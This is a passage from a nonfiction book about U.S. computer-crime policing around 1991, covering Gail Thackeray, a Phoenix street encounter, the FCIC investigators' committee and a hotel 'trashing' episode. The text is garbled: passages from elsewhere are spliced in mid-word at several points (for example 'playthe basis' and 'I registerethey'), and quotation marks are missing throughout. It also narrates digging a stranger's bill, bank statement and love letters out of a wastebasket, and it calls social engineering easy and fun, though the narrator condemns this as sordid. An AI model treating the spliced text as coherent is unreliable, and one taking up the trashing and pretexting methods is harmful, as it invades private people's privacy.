neat rotten things to do.     If there were one thing Thackeray would like to have, it would be an effective legal end run through this new fragmentation minefield.    It would be a new form of electronic search warrant, an  electronic letter of marque  to be issued by a judge.  It would create a new category of  electronic emergency.   Like a wiretap, its use would be rare, but it would cut across state lines and force swift cooperation from all concerned.  Cellular, phone, laser, computer network, PBXes, AT T, Baby Bells, long distance entrepreneurs, packet radio.  Some document, some mighty court  order, that could slice through four thousand separate forms of corporate red tape, and get her at once to the source of calls, the source of email threats and viruses, the sources of bomb threats, kidnapping threats.   From now on,  she says,  the Lindbergh baby will always die.     Something that would make the Net sit still, if only for a moment.  Something that would get her up to speed.  Seven league boots.  That's what she really needs.   Those guys move in nanoseconds and I'm on the Pony Express.     And then, too, there's the coming international angle. Electronic crime has never been easy to localize, to tie to a physical jurisdiction.  And phone phreaks and hackers loathe boundaries, they jump them whenever they can.  The English.  The Dutch.  And the Germans, especially the ubiquitous Chaos Computer Club.  The Australians.  They've all learned phone phreaking from America.  It's a growth mischief industry.  The multinational networks are global, but governments and the police simply aren't.  Neither are the laws.  Or the legal frameworks for citizen protection.    One language is global, though  English.  Phone phreaks speak English  it's their native tongue even if they're Germans. English may have started in England but now it's the Net language  it might as well be called  CNNese.     Asians just aren't much into phone phreaking.  They're the world masters at organized software piracy.  The French aren't into phone phreaking either.  The French are into computerized industrial espionage.    In the old days of the MIT righteous hackerdom, crashing systems didn't hurt anybody.  Not all that much, anyway.  Not permanently.  Now the players are more venal.  Now the consequences are worse.  Hacking will begin killing people soon. Already there are methods of stacking calls onto 911 systems, annoying the police, and possibly causing the death of some poor soul calling in with a genuine emergency.  Hackers in Amtrak computers, or air traffic control computers, will kill somebody someday.  Maybe a lot of people.  Gail Thackeray expects it.    And the viruses are getting nastier.  The  Scud  virus is the latest one out.  It wipes hard disks.    According to Thackeray, the idea that phone phreaks are Robin Hoods is a fraud.  They don't deserve this repute. Basically, they pick on the weak.  AT T now protects itself with the fearsome ANI  Automatic Number Identification  trace capability.  When AT T wised up and tightened security generally, the phreaks drifted into the Baby Bells.  The Baby Bells lashed out in 1989 and 1990, so the phreaks switched to smaller long  distance entrepreneurs.  Today, they are moving into locally owned PBXes and voice mail systems, which are full of security holes, dreadfully easy to hack.  These victims aren't the moneybags Sheriff of Nottingham or Bad King John, but small groups of innocent people who find it hard to protect themselves, and who really suffer from these depredations.  Phone phreaks pick on the weak.  They do it for power.  If it were legal, they wouldn't do it.  They don't want service, or knowledge, they want the thrill of power tripping.  There's plenty of knowledge or service around, if you're willing to pay.  Phone phreaks don't pay, they steal.  It's because it is illegal that it feels like power, that it gratifies their vanity.    I leave Gail Thackeray with a handshake at the door of her office building  a vast International Style office building downtown.  The Sheriff's office is renting part of it.  I get the vague impression that quite a lot of the building is empty  real estate crash.    In a Phoenix sports apparel store, in a downtown mall, I meet the  Sun Devil  himself.  He is the cartoon mascot of Arizona State University, whose football stadium,  Sundevil,  is near the local Secret Service HQ  hence the name Operation Sundevil.  The Sun Devil himself is named  Sparky.   Sparky the Sun Devil is maroon and bright yellow, the school colors.  Sparky brandishes a three tined yellow pitchfork.  He has a small mustache, pointed ears, a barbed tail, and is dashing forward jabbing the air with the pitchfork, with an expression of devilish glee.    Phoenix was the home of Operation Sundevil.  The Legion of Doom ran a hacker bulletin board called  The Phoenix Project.  An Australian hacker named  Phoenix  once burrowed through the Internet to attack Cliff Stoll, then bragged and boasted about it to THE NEW YORK TIMES.  This net of coincidence is both odd and meaningless.    The headquarters of the Arizona Attorney General, Gail Thackeray's former workplace, is on 1275 Washington Avenue.  Many of the downtown streets in Phoenix are named after prominent American presidents   Washington, Jefferson, Madison....    After dark, all the employees go home to their suburbs. Washington, Jefferson and Madison  what would be the Phoenix inner city, if there were an inner city in this sprawling automobile bred town  become the haunts of transients and derelicts.  The homeless. The sidewalks along Washington are lined with orange trees.  Ripe fallen fruit lies scattered like croquet balls on the sidewalks and gutters.  No one seems to be eating them.  I try a fresh one.  It tastes unbearably bitter.    The Attorney General's office, built in 1981 during the Babbitt administration, is a long low two story building of white cement and wall sized sheets of curtain glass.  Behind each glass wall is a lawyer's office, quite open and visible to anyone strolling by.  Across the street is a dour government building labelled simply ECONOMIC SECURITY, something that has not been in great supply in the American Southwest lately.    The offices are about twelve feet square.  They feature tall wooden cases full of red spined lawbooks  Wang computer monitors  telephones  Post it notes galore.  Also framed law diplomas and a general excess of bad Western landscape art. Ansel Adams photos are a big favorite, perhaps to compensate for the dismal specter of the parking lot, two acres of striped black asphalt, which features gravel landscaping and some sickly  looking barrel cacti.    It has grown dark.  Gail Thackeray has told me that the people who work late here, are afraid of muggings in the parking lot.  It seems cruelly ironic that a woman tracing electronic racketeers across the interstate labyrinth of Cyberspace should fear an assault by a homeless derelict in the parking lot of her own workplace.    Perhaps this is less than coincidence.  Perhaps these two seemingly disparate worlds are somehow generating one another. The poor and disenfranchised take to the streets, while the rich and computer equipped, safe in their bedrooms, chatter over their modems.  Quite often the derelicts kick the glass out and break in to the lawyers' offices, if they see something they need or want badly enough.    I cross the parking lot to the street behind the Attorney General's office.  A pair of young tramps are bedding down on flattened sheets of cardboard, under an alcove stretching over the sidewalk.  One tramp wears a glitter covered T shirt reading  CALIFORNIA  in Coca Cola cursive.  His nose and cheeks look chafed and swollen  they glisten with what seems to be Vaseline. The other tramp has a ragged long sleeved shirt and lank brown hair parted in the middle. They both wear blue jeans coated in grime.  They are both drunk.     You guys crash here a lot   I ask them.    They look at me warily.  I am wearing black jeans, a black pinstriped suit jacket and a black silk tie.  I have odd shoes and a funny haircut.     It's our first time here,  says the red nosed tramp unconvincingly. There is a lot of cardboard stacked here.  More than any two people could use.     We usually stay at the Vinnie's down the street,  says the brown haired tramp, puffing a Marlboro with a meditative air, as he sprawls with his head on a blue nylon backpack.   The Saint Vincent's.      You know who works in that building over there   I ask, pointing.    The brown haired tramp shrugs.   Some kind of attorneys, it says.     We urge one another to take it easy.  I give them five bucks.    A block down the street I meet a vigorous workman who is wheeling along some kind of industrial trolley  it has what appears to be a tank of propane on it.     We make eye contact.  We nod politely.  I walk past him.  Hey!  Excuse me sir!  he says.     Yes   I say, stopping and turning.     Have you seen,  the guy says rapidly,  a black guy, about 6'7 , scars on both his cheeks like this    he gestures    wears a black baseball cap on backwards, wandering around here anyplace       Sounds like I don't much WANT to meet him,  I say.     He took my wallet,  says my new acquaintance.   Took it this morning.  Y'know, some people would be SCARED of a guy like that.  But I'm not scared.  I'm from Chicago.  I'm gonna hunt him down.  We do things like that in Chicago.      Yeah       I went to the cops and now he's got an APB out on his ass,  he says with satisfaction.   You run into him, you let me know.      Okay,  I say.   What is your name, sir       Stanley....      And how can I reach you       Oh,  Stanley says, in the same rapid voice,  you don't have to reach, uh, me.  You can just call the cops.  Go straight to the cops.  He reaches into a pocket and pulls out a greasy piece of pasteboard.   See, here's my report on him.     I look.  The  report,  the size of an index card, is labelled PRO ACT   Phoenix Residents Opposing Active Crime Threat.... or is it Organized Against Crime Threat   In the darkening street it's hard to read.  Some kind of vigilante group   Neighborhood watch   I feel very puzzled.     Are you a police officer, sir      He smiles, seems very pleased by the question.     No,  he says.     But you are a 'Phoenix Resident '      Would you believe a homeless person,  Stanley says.     Really   But what's with the...   For the first time I take a close look at Stanley's trolley.  It's a rubber wheeled thing of industrial metal, but the device I had mistaken for a tank of propane is in fact a water cooler.  Stanley also has an Army duffel bag, stuffed tight as a sausage with clothing or perhaps a tent, and, at the base of his trolley, a cardboard box and a battered leather briefcase.     I see,  I say, quite at a loss.  For the first time I notice that Stanley has a wallet.  He has not lost his wallet at all.  It is in his back pocket and chained to his belt.  It's not a new wallet.  It seems to have seen a lot of wear.     Well, you know how it is, brother,  says Stanley.  Now that I know that he is homeless  A POSSIBLE THREAT  my entire perception of him has changed in an instant.  His speech, which once seemed just bright and enthusiastic, now seems to have a dangerous tang of mania.   I have to do this!  he assures me.  Track this guy down... It's a thing I do... you know... to keep myself together!   He smiles, nods, lifts his trolley by its decaying rubber handgrips.     Gotta work together, y'know,  Stanley booms, his face alight with cheerfulness,  the police can't do everything!     The gentlemen I met in my stroll in downtown Phoenix are the only computer illiterates in this book.  To regard them as irrelevant, however, would be a grave mistake.    As computerization spreads across society, the populace at large is subjected to wave after wave of future shock.  But, as a necessary converse, the  computer community  itself is subjected to wave after wave of incoming computer illiterates. How will those currently enjoying America's digital bounty regard, and treat, all this teeming refuse yearning to breathe free   Will the electronic frontier be another Land of Opportunity  or an armed and monitored enclave, where the disenfranchised snuggle on their cardboard at the locked doors of our houses of justice     Some people just don't get along with computers.  They can't read.  They can't type.  They just don't have it in their heads to master arcane instructions in wirebound manuals. Somewhere, the process of computerization of the populace will reach a limit.  Some people  quite decent people maybe, who might have thrived in any other situation  will be left irretrievably outside the bounds.  What's to be done with these people, in the bright new shiny electroworld   How will they be regarded, by the mouse whizzing masters of cyberspace   With contempt  Indifference   Fear     In retrospect, it astonishes me to realize how quickly poor Stanley became a perceived threat.  Surprise and fear are closely allied feelings.  And the world of computing is full of surprises.    I met one character in the streets of Phoenix whose role in those book is supremely and directly relevant.  That personage was Stanley's giant thieving scarred phantom.  This phantasm is everywhere in this book.  He is the specter haunting cyberspace.    Sometimes he's a maniac vandal ready to smash the phone system for no sane reason at all.  Sometimes he's a fascist fed, coldly programming his mighty mainframes to destroy our Bill of Rights.  Sometimes he's a telco bureaucrat, covertly conspiring to register all modems in the service of an Orwellian surveillance regime.  Mostly, though, this fearsome phantom is a  hacker.   He's strange, he doesn't belong, he's not authorized, he doesn't smell right, he's not keeping his proper place, he's not one of us.  The focus of fear is the hacker, for much the same reasons that Stanley's fancied assailant is black.    Stanley's demon can't go away, because he doesn't exist. Despite singleminded and tremendous effort, he can't be arrested, sued, jailed, or fired.  The only constructive way to do ANYTHING about him is to learn more about Stanley himself.  This learning process may be repellent, it may be ugly, it may involve grave elements of paranoiac confusion, but it's necessary.  Knowing Stanley requires something more than class crossing condescension.  It requires more than steely legal objectivity. It requires human compassion and sympathy.    To know Stanley is to know his demon.  If you know the other guy's demon, then maybe you'll come to know some of your own.  You'll be able to separate reality from illusion.  And then you won't do your cause, and yourself, more harm than good.  Like poor damned Stanley from Chicago did.       The Federal Computer Investigations Committee  FCIC  is the most important and influential organization in the realm of American computer crime.  Since the police of other countries have largely taken their computer crime cues from American methods, the FCIC might well be called the most important computer crime group in the world.    It is also, by federal standards, an organization of great unorthodoxy.  State and local investigators mix with federal agents.  Lawyers, financial auditors and computer  security programmers trade notes with street cops.  Industry vendors and telco security people show up to explain their gadgetry and plead for protection and justice.  Private investigators, think tank experts and industry pundits throw in their two cents' worth.  The FCIC is the antithesis of a formal bureaucracy.    Members of the FCIC are obscurely proud of this fact  they recognize their group as aberrant, but are entirely convinced that this, for them, outright WEIRD behavior is nevertheless ABSOLUTELY NECESSARY to get their jobs done.    FCIC regulars  from the Secret Service, the FBI, the IRS, the Department of Labor, the offices of federal attorneys, state police, the Air Force, from military intelligence  often attend meetings, held hither and thither across the country, at their own expense.  The FCIC doesn't get grants.  It doesn't charge membership fees.  It doesn't have a boss.  It has no headquarters  just a mail drop in Washington DC, at the Fraud Division of the Secret Service.  It doesn't have a budget.  It doesn't have schedules.  It meets three times a year  sort of. Sometimes it issues publications, but the FCIC has no regular publisher, no treasurer, not even a secretary.  There are no minutes of FCIC meetings.  Non federal people are considered  non voting members,  but there's not much in the way of elections.  There are no badges, lapel pins or certificates of membership.  Everyone is on a first name basis.  There are about forty of them.  Nobody knows how many, exactly.  People come, people go  sometimes people  go  formally but still hang around anyway.  Nobody has ever exactly figured out what  membership  of this  Committee  actually entails.    Strange as this may seem to some, to anyone familiar with the social world of computing, the  organization  of the FCIC is very recognizable.     For years now, economists and management theorists have speculated that the tidal wave of the information revolution would destroy rigid, pyramidal bureaucracies, where everything is top down and centrally controlled.  Highly trained  employees  would take on much greater autonomy, being self starting, and self motivating, moving from place to place, task to task, with great speed and fluidity.   Ad hocracy  would rule, with groups of people spontaneously knitting together across organizational lines, tackling the problem at hand, applying intense computer  aided expertise to it, and then vanishing whence they came.    This is more or less what has actually happened in the world of federal computer investigation.  With the conspicuous exception of the phone companies, which are after all over a hundred years old, practically EVERY organization that playthe basis of this fear is not irrational.    Fear of hackers goes well beyond the fear of merely criminal activity.    Subversion and manipulation of the phone system is an act with disturbing political overtones.  In America, computers and telephones are potent symbols of organized authority and the technocratic business elite.    But there is an element in American culture that has always strongly rebelled against these symbols  rebelled against all large industrial computers and all phone companies.  A certain anarchical tinge deep in the American soul delights in causing confusion and pain to all bureaucracies, including technological ones.    There is sometimes malice and vandalism in this attitude, but it is a deep and cherished part of the American national character.  The outlaw, the rebel, the rugged individual, the pioneer, the sturdy Jeffersonian yeoman, the private citizen resisting interference in his pursuit of happiness  these are figures that all Americans recognize, and that many will strongly applaud and defend.    Many scrupulously law abiding citizens today do cutting  edge work with electronics  work that has already had tremendous social influence and will have much more in years to come.  In all truth, these talented, hardworking, law abiding, mature, adult people are far more disturbing to the peace and order of the current status quo than any scofflaw group of romantic teenage punk kids.  These law abiding hackers have the power, ability, and willingness to influence other people's lives quite unpredictably.  They have means, motive, and opportunity to meddle drastically with the American social order.  When corralled into governments, universities, or large multinational companies, and forced to follow rulebooks and wear suits and ties, they at least have some conventional halters on their freedom of action.  But when loosed alone, or in small groups, and fired by imagination and the entrepreneurial spirit, they can move mountains  causing landslides that will likely crash directly is any important role in this book functions just like the FCIC.  The Chicago Task Force, the Arizona Racketeering Unit, the Legion of Doom, the Phrack crowd, the Electronic Frontier Foundation  they ALL look and act like  tiger teams  or  user's groups.   They are all electronic ad hocracies leaping up spontaneously to attempt to meet a need.     Some are police.  Some are, by strict definition, criminals.  Some are political interest groups.  But every single group has that same quality of apparent spontaneity   Hey, gang! My uncle's got a barn  let's put on a show!     Every one of these groups is embarrassed by this  amateurism,  and, for the sake of their public image in a world of non computer people, they all attempt to look as stern and formal and impressive as possible.  These electronic frontier  dwellers resemble groups of nineteenth century pioneers hankering after the respectability of statehood.  There are however, two crucial differences in the historical experience of these  pioneers  of the nineteeth and twenty first centuries.    First, powerful information technology DOES play into the hands of small, fluid, loosely organized groups.  There have always been  pioneers,   hobbyists,   amateurs,   dilettantes,   volunteers,   movements,   users' groups  and  blue ribbon panels of experts  around.  But a group of this kind  when technically equipped to ship huge amounts of specialized information, at lightning speed, to its members, to government, and to the press  is simply a different kind of animal.  It's like the difference between an eel and an electric eel.    The second crucial change is that American society is currently in a state approaching permanent technological revolution.  In the world of computers particularly, it is practically impossible to EVER stop being a  pioneer,  unless you either drop dead or deliberately jump off the bus.  The scene has never slowed down enough to become well institutionalized. And after twenty, thirty, forty years the  computer revolution  continues to spread, to permeate new corners of society. Anything that really works is already obsolete.    If you spend your entire working life as a  pioneer,  the word  pioneer  begins to lose its meaning.  Your way of life looks less and less like an introduction to something else  more stable and organized, and more and more like JUST THE WAY THINGS ARE.  A  permanent revolution  is really a contradiction in terms.  If  turmoil  lasts long enough, it simply becomes A NEW KIND OF SOCIETY  still the same game of history, but new players, new rules.    Apply this to the world of late twentieth century law enforcement, and the implications are novel and puzzling indeed. Any bureaucratic rulebook you write about computer crime will be flawed when you write it, and almost an antique by the time it sees print.  The fluidity and fast reactions of the FCIC give them a great advantage in this regard, which explains their success.  Even with the best will in the world  which it does not, in fact, possess  it is impossible for an organization the size of the U.S. Federal Bureau of Investigation to get up to speed on the theory and practice of computer crime.  If they tried to train all their agents to do this, it would be SUICIDAL, as they would NEVER BE ABLE TO DO ANYTHING ELSE.    The FBI does try to train its agents in the basics of electronic crime, at their base in Quantico, Virginia.  And the Secret Service, along with many other law enforcement groups, runs quite successful and well attended training courses on wire fraud, business crime, and computer intrusion at the Federal Law Enforcement Training Center  FLETC, pronounced  fletsy   in Glynco, Georgia.  But the best efforts of these bureaucracies does not remove the absolute need for a  cutting edge mess  like the FCIC.    For you see  the members of FCIC ARE the trainers of the rest of law enforcement.  Practically and literally speaking, they are the Glynco computer crime faculty by another name.  If the FCIC went over a cliff on a bus, the U.S. law enforcement community would be rendered deaf dumb and blind in the world of computer crime, and would swiftly feel a desperate need to reinvent them.  And this is no time to go starting from scratch.    On June 11, 1991, I once again arrived in Phoenix, Arizona, for the latest meeting of the Federal Computer Investigations Committee.  This was more or less the twentieth meeting of this stellar group.  The count was uncertain, since nobody could figure out whether to include the meetings of  the Colluquy,  which is what the FCIC was called in the mid 1980s before it had even managed to obtain the dignity of its own acronym.    Since my last visit to Arizona, in May, the local AzScam bribery scandal had resolved itself in a general muddle of humiliation.  The Phoenix chief of police, whose agents had videotaped nine state legislators up to no good, had resigned his office in a tussle with the Phoenix city council over the propriety of his undercover operations.    The Phoenix Chief could now join Gail Thackeray and eleven of her closest associates in the shared experience of politically motivated unemployment.  As of June, resignations were still continuing at the Arizona Attorney General's office, which could be interpreted as either a New Broom Sweeping Clean or a Night of the Long Knives Part II, depending on your point of view.    The meeting of FCIC was held at the Scottsdale Hilton Resort. Scottsdale is a wealthy suburb of Phoenix, known as  Scottsdull  to scoffing local trendies, but well equipped with posh shopping malls and manicured lawns, while conspicuously undersupplied with homeless derelicts.  The Scottsdale Hilton Resort was a sprawling hotel in postmodern crypto Southwestern style.  It featured a  mission bell tower  plated in turquoise tile and vaguely resembling a Saudi minaret.    Inside it was all barbarically striped Santa Fe Style decor.  There was a health spa downstairs and a large oddly  shaped pool in the patio.  A poolside umbrella stand offered Ben and Jerry's politically correct Peace Pops.    I registerethey REALLY PAY ATTENTION, they are GRATEFUL FOR YOUR INSIGHTS, and they FORGIVE YOU, which in nine cases out of ten is something even your boss can't do, because as soon as you start talking  ROM,   BBS,  or  T 1 trunk,  his eyes glaze over.    I had nothing much to do that afternoon.  The FCIC were beavering away in their conference room.  Doors were firmly closed, windows too dark to peer through.  I wondered what a real hacker, a computer intruder, would do at a meeting like this.    The answer came at once.  He would  trash  the place. Not reduce the place to trash in some orgy of vandalism  that's not the use of the term in the hacker milieu.  No, he would quietly EMPTY THE TRASH BASKETS and silently raid any valuable data indiscreetly thrown away.    Journalists have been known to do this.   Journalists hunting information have been known to do almost every single unethical thing that hackers have ever done.  They also throw in a few awful techniques all their own.   The legality of 'trashing' is somewhat dubious but it is not in fact flagrantly illegal.  It was, however, absurd to contemplate trashing the FCIC.  These people knew all about trashing.  I wouldn't last fifteen seconds.    The idea sounded interesting, though.  I'd been hearing a lot about the practice lately.  On the spur of the moment, I decided I would try trashing the office ACROSS THE HALL from the FCIC, an area which had nothing to do with the investigators.    The office was tiny  six chairs, a table.... Nevertheless, it was open, so I dug around in its plastic trash can.    To my utter astonishment, I came up with the torn scraps of a SPRINT long distance phone bill.  More digging produced a bank statement and the scraps of a hand written letter, along with gum, cigarette ashes, candy wrappers and a day old issue of USA TODAY.    The trash went back in its receptacle while the scraps of data went into my travel bag.  I detoured through the hotel souvenir shop for some Scotch tape and went up to my room.    Coincidence or not, it was quite true.  Some poor soul had, in fact, thrown a SPRINT bill into the hotel's trash.  Date May 1991, total amount due   252.36.  Not a business phone, either, but a residential bill, in the name of someone called Evelyn  not her real name .  Evelyn's records showed a    PAST DUE BILL   !  Here was her nine digit account ID.  Here was a stern computer printed warning       TREAT YOUR FONCARD AS YOU WOULD ANY CREDIT CARD.  TO SECURE AGAINST FRAUD, NEVER GIVE YOUR FONCARD NUMBER OVER THE PHONE UNLESS YOU INITIATED THE CALL.  IF YOU RECEIVE SUSPICIOUS CALLS PLEASE NOTIFY CUSTOMER SERVICE IMMEDIATELY!       I examined my watch.  Still plenty of time left for the FCIC to carry on.  I sorted out the scraps of Evelyn's SPRINT bill and re assembled them with fresh Scotch tape.  Here was her ten digit FONCARD number.  Didn't seem to have the ID number necessary to cause real fraud trouble.    I did, however, have Evelyn's home phone number.  And the phone numbers for a whole crowd of Evelyn's long distance friends and acquaintances.  In San Diego, Folsom, Redondo, Las Vegas, La Jolla, Topeka, and Northampton Massachusetts.  Even somebody in Australia!    I examined other documents.  Here was a bank statement. It was Evelyn's IRA account down at a bank in San Mateo, California  total balance  1877.20 .  Here was a charge card bill for  382.64.  She was paying it off bit by bit.    Driven by motives that were completely unethical and prurient, I now examined the handwritten notes.  They had been torn fairly thoroughly, so much so that it took me almost an entire five minutes to reassemble them.    They were drafts of a love letter.  They had been written on the lined stationery of Evelyn's employer, a biomedical company.  Probably written at work when she should have been doing something else.     Dear Bob,   not his real name   I guess in everyone's life there comes a time when hard decisions have to be made, and this is a difficult one for me  very upsetting.  Since you haven't called me, and I don't understand why, I can only surmise it's because you don't want to.  I thought I would have heard from you Friday.  I did have a few unusual problems with my phone and possibly you tried, I hope so.     Robert, you asked me to 'let go'...     The first note ended.  UNUSUAL PROBLEMS WITH HER PHONE  I looked swiftly at the next note.     Bob, not hearing from you for the whole weekend has left me very perplexed...     Next draft.     Dear Bob, there is so much I don't understand right now, and I wish I did.  I wish I could talk to you, but for some unknown reason you have elected not to call  this is so difficult for me to understand...     She tried again.     Bob, Since I have always held you in such high esteem, I had every hope that we could remain good friends, but now one essential ingredient is missing  respect.  Your ability to discard people when their purpose is served is appalling to me. The kindest thing you could do for me now is to leave me alone. You are no longer welcome in my heart or home...     Try again.     Bob, I wrote a very factual note to you to say how much respect I had lost for you, by the way you treat people, me in particular, so uncaring and cold.  The kindest thing you can do for me is to leave me alone entirely, as you are no longer welcome in my heart or home. I would appreciate it if you could retire your debt to me as soon as possible  I wish no link to you in any way.  Sincerely, Evelyn.     Good heavens, I thought, the bastard actually owes her money!  I turned to the next page.     Bob   very simple.  GOODBYE!  No more mind games  no more fascination  no more coldness  no more respect for you! It's over  Finis.  Evie     There were two versions of the final brushoff letter, but they read about the same.  Maybe she hadn't sent it.  The final item in my illicit and shameful booty was an envelope addressed to  Bob  at his home address, but it had no stamp on it and it hadn't been mailed.    Maybe she'd just been blowing off steam because her rascal boyfriend had neglected to call her one weekend.  Big deal.  Maybe they'd kissed and made up, maybe she and Bob were down at Pop's Chocolate Shop now, sharing a malted.  Sure.    Easy to find out.  All I had to do was call Evelyn up. With a half clever story and enough brass plated gall I could probably trick the truth out of her.  Phone phreaks and hackers deceive people over the phone all the time.  It's called  social engineering.   Social engineering is a very common practice in the underground, and almost magically effective.  Human beings are almost always the weakest link in computer security.  The simplest way to learn Things You Are Not Meant To Know is simply to call up and exploit the knowledgeable people.  With social engineering, you use the bits of specialized knowledge you already have as a key, to manipulate people into believing that you are legitimate.  You can then coax, flatter, or frighten them into revealing almost anything you want to know.  Deceiving people  especially over the phone  is easy and fun.  Exploiting their gullibility is very gratifying  it makes you feel very superior to them.    If I'd been a malicious hacker on a trashing raid, I would now have Evelyn very much in my power.  Given all this inside data, it wouldn't take much effort at all to invent a convincing lie.  If I were ruthless enough, and jaded enough, and clever enough, this momentary indiscretion of hers  maybe committed in tears, who knows  could cause her a whole world of confusion and grief.    I didn't even have to have a MALICIOUS motive.  Maybe I'd be  on her side,  and call up Bob instead, and anonymously threaten to break both his kneecaps if he didn't take Evelyn out for a steak dinner pronto.  It was still profoundly NONE OF MY BUSINESS.  To have gotten this knowledge at all was a sordid act and to use it would be to inflict a sordid injury.    To do all these awful things would require exactly zero high tech expertise.  All it would take was the willingness to do it and a certain amount of bent imagination.    I went back downstairs. The hard working FCIC, who had labored forty five minutes over their schedule, were through for the day, and adjourned to the hotel bar.  We all had a beer.    I had a chat with a guy about  Isis,  or rather IACIS, the International Association of Computer Investigation Specialists.  They're into  computer forensics,  the techniques of picking computer systems apart without destroying vital evidence.  IACIS, currently run out of Oregon, is comprised of investigators in the U.S., Canada, Taiwan and Ireland.   Taiwan and Ireland    I said.  Are TAIWAN and IRELAND really in the forefront of this stuff   Well not exactly, my informant admitted.  They just happen to have been the first ones to have caught on by word of mouth.  Still, the international angle counts, because this is obviously an international problem. Phone lines go everywhere.    There was a Mountie here from the Royal Canadian Mounted Police.  He seemed to be having quite a good time.  Nobody had flung this Canadian out because he might pose a foreign security risk.  These are cyberspace cops.  They still worry a lot about  jurisdictions,  but mere geography is the least of their troubles.    NASA had failed to show.  NASA suffers a lot from computer intrusions, in particular from Australian raiders and a well trumpeted Chaos Computer Club case, and in 1990 there was a brief press flurry when it was revealed that one of NASA's Houston branch exchanges had been systematically ripped off by a gang of phone phreaks.  But the NASA guys had had their funding cut.  They were stripping everything.    Air Force OSI, its Office of Special Investigations, is the ONLY federal entity dedicated full time to computer security. They'd been expected to show up in force, but some of them had cancelled  a Pentagon budget pinch.    As the empties piled up, the guys began joshing around and telling war stories.   These are cops,  Thackeray said tolerantly.   If they're not talking shop they talk about women and beer.     I heard the story about the guy who, asked for  a copy  of a computer disk, PHOTOCOPIED THE LABEL ON IT.  He put the floppy disk onto the glass plate of a photocopier.  The blast of static when the copier worked completely erased all the real information on the disk.    Some other poor souls threw a whole bag of confiscated diskettes into the squad car trunk next to the police radio.  The powerful radio signal blasted them, too.     We heard a bit about Dave Geneson, the first computer prosecutor, a mainframe runner in Dade County, turned lawyer. Dave Geneson was one guy who had hit the ground running, a signal virtue in making the transition to computer crime.  It was generally agreed that it was easier to learn the world of computers first, then police or prosecutorial work.  You could take certain computer people and train 'em to successful police work  but of course they had to have the COP MENTALITY.  They had to have street smarts.  Patience.  Persistence.  And discretion. You've got to make sure they're not hot shots, show offs,  cowboys.     Most of the folks in the bar had backgrounds in military intelligence, or drugs, or homicide.  It was rudely opined that  military intelligence  was a contradiction in terms, while even the grisly world of homicide was considered cleaner than drug enforcement.  One guy had been 'way undercover doing dope work in Europe for four years straight.   I'm almost recovered now,  he said deadpan, with the acid black humor that is pure cop.   Hey, now I can say FUCKER without putting MOTHER in front of it.      In the cop world,  another guy said earnestly,  everything is good and bad, black and white.  In the computer world everything is gray.     One guy  a founder of the FCIC, who'd been with the group since it was just the Colluquy  described his own introduction to the field.  He'd been a Washington DC homicide guy called in on a  hacker  case.  From the word  hacker,  he naturally assumed he was on the trail of a knife wielding marauder, and went to the computer center expecting blood and a body.  When he finally figured out what was happening there  after loudly demanding, in vain, that the programmers  speak English  , he called headquarters and told them he was clueless about computers.  They told him nobody else knew diddly either, and to get the hell back to work.    So, he said, he had proceeded by comparisons.  By analogy.  By metaphor.   Somebody broke in to your computer, huh    Breaking and entering  I can understand that.  How'd he get in    Over the phone lines.   Harassing phone calls, I can understand that!  What we need here is a tap and a trace!    It worked.  It was better than nothing.  And it worked a lot faster when he got hold of another cop who'd done something similar.  And then the two of them got another, and another, and pretty soon the Colluquy was a happening thing.  It helped a lot that everybody seemed to know Carlton Fitzpatrick, the data  processing trainer in Glynco.    The ice broke big time in Memphis in '86.  The Colluquy had attracted a bunch of new guys  Secret Service, FBI, military, other feds, heavy guys.  Nobody wanted to tell anybody anything. They suspected that if word got back to the home office they'd all be fired.  They passed an uncomfortably guarded afternoon.    The formalities got them nowhere.  But after the formal session was over, the organizers brought in a case of beer.  As soon as the participants knocked it off with the bureaucratic ranks and turf fighting, everything changed.   I bared my soul,  one veteran reminisced proudly.  By nightfall they were building pyramids of empty beer cans and doing everything but composing a team fight song.    FCIC were not the only computer crime people around. There was DATTA  District Attorneys' Technology Theft Association , though they mostly specialized in chip theft, intellectual property, and black market cases.  There was HTCIA  High Tech Computer Investigators Association , also out in Silicon Valley, a year older than FCIC and featuring brilliant people like Donald Ingraham.  There was LEETAC  Law Enforcement Electronic Technology Assistance Committee  in Florida, and computer crime units in Illinois and Maryland and Texas and Ohio and Colorado and Pennsylvania.  But these were local groups. FCIC were the first to really network nationally and on a federal level.    FCIC people live on the phone lines.  Not on bulletin board systems  they know very well what boards are, and they know that boards aren't secure.  Everyone in the FCIC has a voice  phone bill like you wouldn't believe.  FCIC people have been tight with the telco people for a long time.  Telephone cyberspace is their native habitat.    FCIC has three basic sub tribes   the trainers, the security people, and the investigators.  That's why it's called an  Investigations Committee  with no mention of the term  computer crime   the dreaded  C word.   FCIC, officially, is  an association of agencies rather than individuals   unofficially, this field is small enough that the influence of individuals and individual expertise is paramount.  Attendance is by invitation only, and most everyone in FCIC considers himself a prophet without honor in his own house.    Again and again I heard this, with different terms but identical sentiments.   I'd been sitting in the wilderness talking to myself.    I was totally isolated.    I was desperate.    FCIC is the best thing there is about computer crime in America.    FCIC is what really works.    This is where you hear real people telling you what's really happening out there, not just lawyers picking nits.    We taught each other everything we knew.     The sincerity of these statements convinces me that this is true.  FCIC is the real thing and it is invaluable.  It's also very sharply at odds with the rest of the traditions and power structure in American law enforcement.  There probably hasn't been anything around as loose and go getting as the FCIC since the start of the U.S. Secret Service in the 1860s.  FCIC people are living like twenty first century people in a twentieth  century environment, and while there's a great deal to be said for that, there's also a great deal to be said against it, and those against it happen to control the budgets.    I listened to two FCIC guys from Jersey compare life histories.  One of them had been a biker in a fairly heavy duty gang in the 1960s.   Oh, did you know so and so   said the other guy from Jersey.   Big guy, heavyset       Yeah, I knew him.      Yeah, he was one of ours.  He was our plant in the gang.      Really   Wow!  Yeah, I knew him.  Helluva guy.     Thackeray reminisced at length about being tear gassed blind in the November 1969 antiwar protests in Washington Circle, covering them for her college paper.   Oh yeah, I was there,  said another cop.   Glad to hear that tear gas hit somethin'.  Haw haw haw.   He'd been so blind himself, he confessed, that later that day he'd arrested a small tree.    FCIC are an odd group, sifted out by coincidence and necessity, and turned into a new kind of cop.  There are a lot of specialized cops in the world  your bunco guys, your drug guys, your tax guys, but the only group that matches FCIC for sheer isolation are probably the child pornography people.  Because they both deal with conspirators who are desperate to exchange forbidden data and also desperate to hide  and because nobody else in law enforcement even wants to hear about it.    FCIC people tend to change jobs a lot.  They tend not to get the equipment and training they want and need.  And they tend to get sued quite often.    As the night wore on and a band set up in the bar, the talk grew darker.  Nothing ever gets done in government, someone opined, until there's a DISASTER.  Computing disasters are awful, but there's no denying that they greatly help the credibility of FCIC people.  The 